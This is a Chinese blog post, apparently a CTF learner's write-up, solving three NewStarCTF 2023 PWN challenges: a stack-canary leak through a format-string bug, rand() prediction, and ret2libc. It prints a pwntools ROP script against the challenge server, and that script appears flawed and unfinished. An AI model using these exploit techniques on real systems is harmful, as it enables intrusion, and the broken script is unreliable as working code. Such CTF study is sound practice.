@@ -1,0 +1,322 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>NewStarCTF2023-week2 | YunL's Blog</title><meta name="author" content="YunL"><meta name="copyright" content="YunL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PWN1-canary 参考视频：【PWN】format_ret2libc_哔哩哔哩_bilibili 题目点击下载：canary终端中查看canary查看程序保护机制：  可知该程序是64位小端程序。 RELRO:    Full RELRO ;无法修改got表 Stack:      Canary found ;不能直接进行溢出     NX:          NX enabled ;堆栈不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewStarCTF2023-week2">
+<meta property="og:url" content="http://example.com/2023/10/05/NewStarCTF2023-week2/index.html">
+<meta property="og:site_name" content="YunL&#39;s Blog">
+<meta property="og:description" content="PWN1-canary 参考视频：【PWN】format_ret2libc_哔哩哔哩_bilibili 题目点击下载：canary终端中查看canary查看程序保护机制：  可知该程序是64位小端程序。 RELRO:    Full RELRO ;无法修改got表 Stack:      Canary found ;不能直接进行溢出     NX:          NX enabled ;堆栈不">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-10-05T10:14:47.000Z">
+<meta property="article:modified_time" content="2023-10-08T13:49:24.159Z">
+<meta property="article:author" content="YunL">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="NewStarCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/10/05/NewStarCTF2023-week2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'NewStarCTF2023-week2',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-08 21:49:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="YunL's Blog"><span class="site-name">YunL's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">NewStarCTF2023-week2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-05T10:14:47.000Z" title="发表于 2023-10-05 18:14:47">2023-10-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-08T13:49:24.159Z" title="更新于 2023-10-08 21:49:24">2023-10-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="NewStarCTF2023-week2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="PWN1-canary"><a href="#PWN1-canary" class="headerlink" title="PWN1-canary"></a>PWN1-canary</h1><p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008012555695.png" alt="image-20231008012555695"></p>
+<p>参考视频：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1fr4y1Z73F?p=13&vd_source=7d48859e90250d0e21637b9efa22c38a">【PWN】format_ret2libc_哔哩哔哩_bilibili</a></p>
+<h2 id="题目点击下载：canary"><a href="#题目点击下载：canary" class="headerlink" title="题目点击下载：canary"></a>题目点击下载：<a href="/download/NewStarCTF2023/canary">canary</a></h2><h2 id="终端中查看canary"><a href="#终端中查看canary" class="headerlink" title="终端中查看canary"></a>终端中查看canary</h2><p>查看程序保护机制：</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231005182802460.png" alt="image-20231005182802460"></p>
+<p>可知该程序是64位小端程序。</p>
+<p>RELRO:    Full RELRO ;无法修改got表</p>
+<p>Stack:      Canary found ;不能直接进行溢出    </p>
+<p>NX:          NX enabled ;堆栈不可执行</p>
+<blockquote>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://www.icode9.com/content-4-626619.html">Canary学习（泄露Canary）-icode9专业技术文章分享</a></p>
+<h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖ebp，eip等，从而达到劫持控制流的目的。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址让shellcode执行。</p>
+<p>当启用栈保护时，函数开始执行的时候会先往栈底插入cookie信息，如果不合法就停止程序运行（栈溢出发生）。攻击者在覆盖返回地址的时候往往也会将cookie信息覆盖掉，导致栈保护检查失败而阻止shellcode的执行，避免漏洞利用成功。在linux中我们将cookie信息成为canary。</p>
+<h4 id="64位系统中其栈结构如下"><a href="#64位系统中其栈结构如下" class="headerlink" title="64位系统中其栈结构如下"></a>64位系统中其栈结构如下</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local var       |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
+
+<h3 id="Canary绕过"><a href="#Canary绕过" class="headerlink" title="Canary绕过"></a>Canary绕过</h3><p>Canary设计以字节\x00结尾，本意是保证Canary可以截断字符串。泄露栈中的Canary的思路是覆盖Canary的低字节，来打印出剩余的Canary部分。需要合适的输出函数，并且需要先泄露Canary，之后再次溢出控制执行流程。</p>
+<p>需要注意：Canary一般最低位是\x00，也就是结尾处，64位程序的canary的大小是8个字节，32位程序的canary的大小是4个字节。</p>
+<h5 id="减去0xa的原因："><a href="#减去0xa的原因：" class="headerlink" title="减去0xa的原因："></a>减去0xa的原因：</h5><p>canary的最低字节为0x00，学过c语言的应该都知道0x00意味着一个字符串的结束。</p>
+<p>printf函数或者put函数无法输出结束字符之后的字符</p>
+<p>故上述代码中压入了100个A和回车，回车将0x00覆盖，回车的ascii码为10，10的十六进制就是0xa</p>
+<p>0x00被0xa覆盖掉之后，剩下的高字节部分就可以泄露出来了</p>
+</blockquote>
+<p>运行该文件：</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231005182904765.png" alt="image-20231005182904765"></p>
+<h2 id="ida查看"><a href="#ida查看" class="headerlink" title="ida查看"></a>ida查看</h2><p>找到&#x2F;bin&#x2F;sh</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231005183039138.png" alt="image-20231005183039138"></p>
+<p>可知’&#x2F;bin&#x2F;sh‘在backdoor函数中</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231005183106742.png" alt="image-20231005183106742"></p>
+<p>F5反编译查看backdoor函数伪代码</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231005183147955.png" alt="image-20231005183147955"></p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231005183219726.png" alt="image-20231005183219726"></p>
+<p>backdoor函数的地址为0x401262</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231006162417888.png" alt="image-20231006162417888"></p>
+<p>再查看main函数</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231005183329465.png" alt="image-20231005183329465"></p>
+<p>发现存在五次打印，两次输入</p>
+<p>其中4次puts打印都是输入提示，没有问题</p>
+<p>第一次输入<code>read(0, buf, 0x20uLL)</code>读取0x20个字节到buf中，buf的大小是0x30，所以不存在栈溢出</p>
+<p>printf函数打印可以看出存在一个格式化字符串漏洞，我们可以根据这个格式化字符串漏洞泄露canary的值</p>
+<p>第二次输入<code>read(0, buf, 0x100uLL)</code>读取0x100个字节到buf中，buf的大小是0x30，存在明显的栈溢出</p>
+<p>双击buf</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231005183426553.png" alt="image-20231005183426553"></p>
+<p>我们来看一下它的栈结构，buf在rbp-0x30的位置，而canary（var_8）在rbp-0x8的位置，偏移为0x28。</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a><strong>解题思路</strong></h2><ul>
+<li>利用格式化字符串漏洞，泄露canary地址，从而泄露出canary值</li>
+<li>再构造栈溢出，利用获取的Canary重新构造payload，获取shell。</li>
+</ul>
+<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231007232910320.png" alt="image-20231007232910320"></p>
+<p>对main函数进行反汇编</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231007233036831.png" alt="image-20231007233036831"></p>
+<p>可以看出canary所在的位置</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231007233131404.png" alt="image-20231007233131404"></p>
+<p>运行这段程序</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231007233409093.png" alt="image-20231007233409093"></p>
+<p>程序停在了第一次输入处</p>
+<p>输入四个a，用16进制的形式进行输出</p>
+<h3 id="这里的-x不能超过9个，超过9个会直接停止运行，疑问待解决"><a href="#这里的-x不能超过9个，超过9个会直接停止运行，疑问待解决" class="headerlink" title="(这里的-%x不能超过9个，超过9个会直接停止运行，疑问待解决"></a>(这里的-%x不能超过9个，超过9个会直接停止运行，疑问待解决</h3><h3 id><a href="#" class="headerlink" title=")"></a><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008000228644.png" alt="image-20231008000228644">)</h3><p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231007234426484.png" alt="image-20231007234426484"></p>
+<p>a对应的ASII码是97，转换为16进制就是61</p>
+<p>输入了4个a，找到4个61连着的位置就行，从左往右数，他格式化字符串的偏移量是6</p>
+<p>结束这次调试，进行一次重新的调试</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231007234743068.png" alt="image-20231007234743068"></p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231007235439268.png" alt="image-20231007235439268"></p>
+<p>在printf函数处下一个断点</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231007235548143.png" alt="image-20231007235548143"></p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231007235645526.png" alt="image-20231007235645526"></p>
+<p>使程序运行</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231007235827427.png" alt="image-20231007235827427"></p>
+<p>接着输入，会运行至printf函数处</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008000022075.png" alt="image-20231008000022075"></p>
+<p>在REGISTERS栏处可以找到RBP的地址0x7fffffffdf40</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008000859980.png" alt="image-20231008000859980"></p>
+<p>接下来查看栈结构</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008001239997.png" alt="image-20231008001239997"></p>
+<p>可以看到我们输入的内容，即格式化字符串所在的位置</p>
+<p>0000| 0x7fffffffdf10 (“aaaa-%x-%x-%x%x-%x-%x%x-%x-%x\n”)</p>
+<p>再由于canary位置是rbp-0x8的位置，可以找到canary的位置</p>
+<p>0040| 0x7fffffffdf38 –&gt; 0xcf82ae1834988e00</p>
+<p>从上往下数得知canary距离格式化字符串的距离是5，再加上刚刚得到的偏移6，可以得出：从输入到canary的偏移是6+5&#x3D;11</p>
+<p>根据偏移11可以获得canary的值</p>
+<p>exp：</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008004242556.png" alt="image-20231008004242556"></p>
+<p>运行该脚本可以获得canary的值</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008004405742.png" alt="image-20231008004405742"></p>
+<p>但由于canary的值是实时变化的，所以不能这样答应出来直接用，我们要对他实时进行接收</p>
+<p>修改exp为：</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008005143788.png" alt="image-20231008005143788"></p>
+<p>接下来进行第二步，利用第二个read函数的栈溢出和获取的Canary重新构造payload，获取shell</p>
+<p>利用<code>ROPgadget --binary canary --string &quot;/bin/sh&quot;</code>查找&#x2F;bin&#x2F;sh获得&#x2F;bin&#x2F;sh的地址为0x402017</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008011040781.png" alt="image-20231008011040781"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008012409948.png" alt="image-20231008012409948"></p>
+<h2 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h2><p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008012513855.png" alt="image-20231008012513855"></p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008012644856.png" alt="image-20231008012644856"></p>
+<h1 id="PWN2-secret-number"><a href="#PWN2-secret-number" class="headerlink" title="PWN2-secret number"></a>PWN2-secret number</h1><p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008123818710.png" alt="image-20231008123818710"></p>
+<h2 id="题目点击下载：secretnumber"><a href="#题目点击下载：secretnumber" class="headerlink" title="题目点击下载：secretnumber"></a>题目点击下载：<a href="/download/NewStarCTF2023/secretnumber">secretnumber</a></h2><h2 id="终端中查看secretnumber"><a href="#终端中查看secretnumber" class="headerlink" title="终端中查看secretnumber"></a>终端中查看secretnumber</h2><p>查看程序保护机制：</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231006135943450.png" alt="image-20231006135943450"></p>
+<h2 id="ida查看-1"><a href="#ida查看-1" class="headerlink" title="ida查看"></a>ida查看</h2><p>找到&#x2F;bin&#x2F;sh</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231006140501199.png" alt="image-20231006140501199"></p>
+<p>可知&#x2F;bin&#x2F;sh在main函数中</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231006140531129.png" alt="image-20231006140531129"></p>
+<p>F5反编译查看main函数伪代码</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231006140845610.png" alt="image-20231006140845610"></p>
+<p>使v6不等于1跳出循环，随后随机数尝试可以getshell</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>利用ctypes库在python代码中调用c语言函数，可以与程序生成同样的伪随机数</p>
+<p>创建一个名为secretnumber.c 的C语言源代码文件</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008124334612.png" alt="image-20231008124334612"></p>
+<p>编译这个C语言源文件为一个动态链接库（.so文件）。</p>
+<p>编译：</p>
+<p><code>gcc -shared -o secretnumber.so secretnumber.c</code></p>
+<p><strong>本题exp:</strong></p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008124924081.png" alt="image-20231008124924081"></p>
+<h2 id="得到flag-1"><a href="#得到flag-1" class="headerlink" title="得到flag"></a>得到flag</h2><p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008123906853.png" alt="image-20231008123906853"></p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008123934688.png" alt="image-20231008123934688"></p>
+<h1 id="PWN3-ret2libc"><a href="#PWN3-ret2libc" class="headerlink" title="PWN3-ret2libc"></a>PWN3-ret2libc</h1><h2 id="题目点击下载：ret2libc"><a href="#题目点击下载：ret2libc" class="headerlink" title="题目点击下载：ret2libc"></a>题目点击下载：<a href="/download/NewStarCTF2023/ret2libc">ret2libc</a></h2><h2 id="终端中查看ret2libc"><a href="#终端中查看ret2libc" class="headerlink" title="终端中查看ret2libc"></a>终端中查看ret2libc</h2><p>查看程序保护机制：</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008125531239.png" alt="image-20231008125531239"></p>
+<p>可知该程序是64位小端程序。NX保护开启。</p>
+<p>运行该程序</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008125554204.png" alt="image-20231008125554204"></p>
+<p>反编译查看main函数伪代码</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008125731711.png" alt="image-20231008125731711"></p>
+<p>read函数处有明显的栈溢出</p>
+<p>偏移量&#x3D;0x80+8</p>
+<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>由于该题没有后门函数，我们要找到system函数以及binsh参数的地址。</p>
+<blockquote>
+<p>那怎么找到system（&#x2F;bin&#x2F;sh）的地址呢？<br>首先我们要知道一个公式 ：函数的真正地址 &#x3D; 基地址 + 偏移地址</p>
+<p>偏移地址：这就是与libc有关的原因，libc是Linux系统下的c函数库，既然是函数库就会存在system函数，binsh参数，libc里面存放的是函数的偏移地址。但是libc.so版本有很多，版本不同偏移量就不同，只要确定了libc版本就能偏移地址。</p>
+<p>基地址：基地址在同一次运行时是相同的，但第二次运行就不同了，所以造成了函数的真正地址一直在变，但即使一直在变，最后三位却一直相同。这样只要知道某个函数的某一次地址，利用它的后三位，然后在网站上<a target="_blank" rel="noopener" href="https://libc.blukat.me/%E6%90%9C%E5%AF%BB%EF%BC%8C%E5%B0%B1%E8%83%BD%E8%8E%B7%E5%BE%97libc%E7%89%88%E6%9C%AC">https://libc.blukat.me/搜寻，就能获得libc版本</a></p>
+<p>综上的分析结果是：泄露某个函数的真正地址，然后利用最后三位来确定libc版本，然后用来查找system函数与该函数的偏移地址。利用公式基地址 &#x3D; 函数的真正地址- 偏移量 来确定基地址。然后利用公式来确定system函数真正地址。</p>
+<p>那怎样获得其他函数的真正地址？<br>我们知道puts函数，write函数等可以打印内容，这样的话我们可以直接利用他们打印出他们的真正地址（注意这个函数必须已经出现过了）。<br>我们可以使用Linux延迟绑定机制。这个只需知道在libc中存在got表和plt表，plt存放的是进入这个函数的地址，而got表中存放的是这个函数的真正地址。<br>我们可以利用puts函数，write函数等函数打印它自己的真正的地址，然后找到libc版本，基地址，然后找到system函数地址<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51032807/article/details/114808339">https://blog.csdn.net/qq_51032807/article/details/114808339</a></p>
+</blockquote>
+<h2 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>计算溢出偏移量</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008145933741.png" alt="image-20231008145933741"></p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008145955046.png" alt="image-20231008145955046"></p>
+<p>偏移是40</p>
+<p>由于该程序是一个64位的程序，函数的参数需要通过寄存器传参，所以需要找一下它的寄存器</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008135729882.png" alt="image-20231008135729882"></p>
+<p>64位程序的参数从左到右依次放入寄存器: rdi, rsi, rdx, rcx, r8, r9中。</p>
+<p>由于需要用到的puts函数和system函数都只有一个参数，所以这里只需要一个rdi寄存器就可以了</p>
+<p>pop rdi ; ret 地址为0x400763</p>
+<h2 id="找到对应版本的libc库"><a href="#找到对应版本的libc库" class="headerlink" title="找到对应版本的libc库"></a>找到对应版本的libc库</h2><p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008191704333.png" alt="image-20231008191704333"></p>
+<p>运行.py文件</p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008191606118.png" alt="image-20231008191606118"></p>
+<p>这里输出了puts函数的实际地址，但此时打印的是一个乱码</p>
+<p>puts_addr&#x3D;0x20756f7920656553</p>
+<p>这里我们看到，远程调试时，puts函数实际地址的后三位为553</p>
+<p>那么我们上网查一下，<a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database search (blukat.me)</a></p>
+<p><img src="/2023/10/05/NewStarCTF2023-week2/image-20231008152218805.png" alt="image-20231008152218805"></p>
+<p>没有找到</p>
+<p>from pwn import *<br>from LibcSearcher import LibcSearcher<br>from ctypes import *</p>
+<p>context(os&#x3D;’linux’, arch&#x3D;’amd64’)<br>context.log_level &#x3D; ‘debug’</p>
+<p>#r &#x3D; process(“.&#x2F;ret2libc”)<br>r &#x3D; remote(‘node4.buuoj.cn’,29426)<br>elf &#x3D; ELF(“.&#x2F;ret2libc”)<br>libc &#x3D; ELF(‘&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6’)</p>
+<p>puts_plt &#x3D; elf.plt[“puts”]<br>puts_got &#x3D; elf.got[“puts”]<br>pop_rdi &#x3D; 0x400763<br>main_addr &#x3D; 0x400698</p>
+<p>payload &#x3D; b’a’*0x28<br>payload +&#x3D; p64(pop_rdi)<br>payload +&#x3D; p64(puts_got)<br>payload +&#x3D; p64(puts_plt)<br>payload +&#x3D; p64(main_addr)</p>
+<p>r.sendlineafter(b’Show me your magic again\n’,payload)<br>r.recvline()</p>
+<p>puts_addr&#x3D;u64(r.recvline(b”\n”)[:1].ljust(8,b”\0”))<br>print(“puts_addr &gt;&gt; “ + hex(puts_addr))</p>
+<p>libc_base &#x3D; puts_addr - libc.symbols[‘puts’]</p>
+<p>system_addr &#x3D; libc_base + libc.symbols[‘system’]<br>bin_sh_addr &#x3D; libc_base + libc.search(‘&#x2F;bin&#x2F;sh’.encode()).<strong>next</strong>()</p>
+<p>payload &#x3D; b’a’*(0x28)<br>payload +&#x3D; p64(pop_rdi)<br>payload +&#x3D; p64(system_addr)<br>payload +&#x3D; p64(bin_sh_addr)<br>r.sendline(payload)</p>
+<p>r.interactive()</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">YunL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/10/05/NewStarCTF2023-week2/">http://example.com/2023/10/05/NewStarCTF2023-week2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">YunL's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/NewStarCTF/">NewStarCTF</a></div><div 